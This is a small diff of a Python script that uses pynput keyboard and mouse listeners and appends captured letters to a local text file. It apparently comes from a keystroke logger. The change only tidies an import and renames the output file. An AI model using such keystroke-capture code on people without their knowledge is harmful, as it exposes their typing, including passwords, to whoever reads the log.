@@ -1,4 +1,4 @@
-from pynput.keyboard import Key, Listener as KeyboardListener
+from pynput.keyboard import Listener as KeyboardListener
 from pynput.mouse import Button, Listener as MouseListener
 import time
 
@@ -80,7 +80,7 @@ def clearLetter(key):
         writeText(letter)
         
 
-def writeText(letter, file="plaintext.txt"):
+def writeText(letter, file="text.txt"):
 
         with open(file, "a") as f:
                 f.write(letter)
